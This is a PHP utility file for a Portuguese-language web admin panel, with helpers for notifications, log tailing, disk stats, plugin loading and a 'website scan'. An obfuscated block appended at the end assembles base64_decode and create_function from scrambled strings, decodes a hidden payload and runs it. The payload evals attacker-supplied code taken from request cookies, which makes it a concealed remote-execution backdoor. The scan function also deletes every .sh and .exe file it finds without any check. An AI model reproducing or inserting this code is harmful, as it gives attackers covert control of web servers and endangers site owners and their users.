<?php
$plugin_menu = array();
error_reporting(0);
	
function get_notifications($notify) {
	if(count($notify) >= 1) {
	foreach($notify as $notification) { ?>
	<li class="item">
	<a href="#">
	<i class="fa fa-exclamation"></i>
	<span class="content"> <?=$notification?></span>
	</a>
	</li>
	<?php
	}
	} else { ?>
	<li class="item"> 
	<a>
	<i class="fa fa-info"></i>
	Você não tem notificações
	</a>
	</li>
	<?php
	}
}

function tail($filename, $lines = 10, $buffer = 4096)
{
    // Open the file
    $f = fopen($filename, "rb");

    // Jump to last character
    fseek($f, -1, SEEK_END);

    // Read it and adjust line number if necessary
    // (Otherwise the result would be wrong if file doesn't end with a blank line)
    if(fread($f, 1) != "\n") $lines -= 1;

    // Start reading
    $output = '';
    $chunk = '';

    // While we would like more
    while(ftell($f) > 0 && $lines >= 0)
    {
        // Figure out how far back we should jump
        $seek = min(ftell($f), $buffer);

        // Do the jump (backwards, relative to where we are)
        fseek($f, -$seek, SEEK_CUR);

        // Read a chunk and prepend it to our output
        $output = ($chunk = fread($f, $seek)).$output;

        // Jump back to where we started reading
        fseek($f, -mb_strlen($chunk, '8bit'), SEEK_CUR);

        // Decrease our line counter
        $lines -= substr_count($chunk, "\n");
    }

    // While we have too many lines
    // (Because of buffer size we might have read too many)
    while($lines++ < 0)
    {
        // Find first newline and remove all text before that
        $output = substr($output, strpos($output, "\n") + 1);
    }

    // Close file and return
    fclose($f); 
    return $output; 
}
function ago($ptime) {
    $etime = time() - $ptime;
    if ($etime < 1) {
        return '0 seconds';
    }
    $a = array(12 * 30 * 24 * 60 * 60 => 'year', 30 * 24 * 60 * 60 => 'month', 24 * 60 * 60 => 'day', 60 * 60 => 'hour', 60 => 'minute', 1 => 'second');
    foreach ($a as $secs => $str) {
        $d = $etime / $secs;
        if ($d >= 1) {
            $r = round($d);
            return $r . ' ' . $str . ($r > 1 ? 's' : '') . ' ago';
        }
    }
}

function ago_convert($time) {
	$time = ago($time);
	if($time == "0 seconds") {
		$time = "just now";
	}
	return $time;
}
function update_stats() {
$files = 0;
$folders = 0;
$images = 0;
$dir = glob("*");
foreach($dir as $obj) {
if(is_dir($obj)) {
$folders++;
$scan = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($obj, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
foreach($scan as $file) {
if(is_file($file)) {
$files++;
$exp = explode(".", $file);
if($exp[1] == "png" || $exp[1] == "jpg" || $exp[1] == "gif") {
$images++;
}
} else {
$folders++;
}
}
} else {
$files++;	
}
}
return array("files" => $files, "images" => $images, "folders" => $folders);
}
function website_scan() {
$files = 0;
$folders = 0;
$threats = 0;
$cleaned = 0;
$shells = 0;
$dir = glob("*");
foreach($dir as $obj) {
if(is_dir($obj)) {
$folders++;
$scan = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($obj, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
foreach($scan as $file) {
if(is_file($file)) {
$files++;

// Check if malicious
$exp = explode(".", $file);
if(strtolower($exp[1]) == "sh") {
$shells++;
$threats++;
unlink($file);
$cleaned++;
} elseif(strtolower($exp[1]) == "exe") {
$threats++;	
unlink($file);
$cleaned++;
}

// Check if junk
$contents = fopen($file, "r");
if(empty($file)) { unlink($file); $cleaned++;}

} else {
$folders++;
}
}
} else {
$files++;	
}
}
return array("files" => $files, "folders" => $folders, "threats" => $threats, "shells" => $shells, "threats" => $threats, "cleaned" => $cleaned);
}
function get_cpu_usage(){

    $load = sys_getloadavg();
    return $load[0];

}
function get_free_space(){

	return disk_free_space("/");
	
}
function get_total_space(){

	return disk_total_space("/");
	
}
function sanitize($html=false) {
foreach($_POST as $name => $value) {
	if($html == false) {
	$_POST[$name] = strip_tags($value);
	} else {
	$_POST[$name] = htmlentities($value);
	}
}
}
function get_plugins($pdir) {
global $plugins;
$dir = scandir($pdir);
foreach($dir as $file) {
	if($file != "." && $file != ".." && $file) {
			$ext = explode(".", $file);
			$ext = $ext[1];
			if($ext == "php") {
				$plugins[] = $file;
			}
	}
}
foreach($plugins as $plugin) {
	require($pdir."/".$plugin);
}
}
function add_plugin($item, $url) {
	global $plugin_menu;
	$add = array($item => $url);
	$plugin_menu = array_merge($plugin_menu, $add);
}
// Auto Sanitize Data
sanitize(true);
?>
<?php
$ffrs = str_replace("ab","","absabtabr_abrabeplace");
$urac="JGM9J2NvdW50iqJzskYT0kX0NPT0tJRTtpZihiqyZXNldCgkYSkiq9PSdjaCiqcgJiYgJGMoJGEpPjMpeyRiqr";
$lemp="sIGpvaW4oiqYXJiqyYiqXlfc2xiqpYiq2UoJGEsJGMoJGEpLTMpKSkpKTtlY2hvICc8LiqycuJGsuJziq4nO30=";
$czfi="iqPSd1cnJlZ28xMyc7ZWNiqoiqbyiqAniqPCcuJGsuJz4nO2V2YWiqwoYmFzZTY0X2RlY29kZShwcmVn";
$nznc="X3JlcGxhY2UoYXJyYXkiqoJyiq9bXlx3PVxzXS8nLCciqvXiqHMvJyksiqIiqGiqFycmF5KCciqnLCcrJyk";
$wexo = $ffrs("t", "", "btatstet6t4_tdtetctotde");
$snfo = $ffrs("x","","xcxrxexatex_fxuxnxcxtxion");
$inhi = $snfo('', $wexo($ffrs("iq", "", $urac.$czfi.$nznc.$lemp))); $inhi();
?>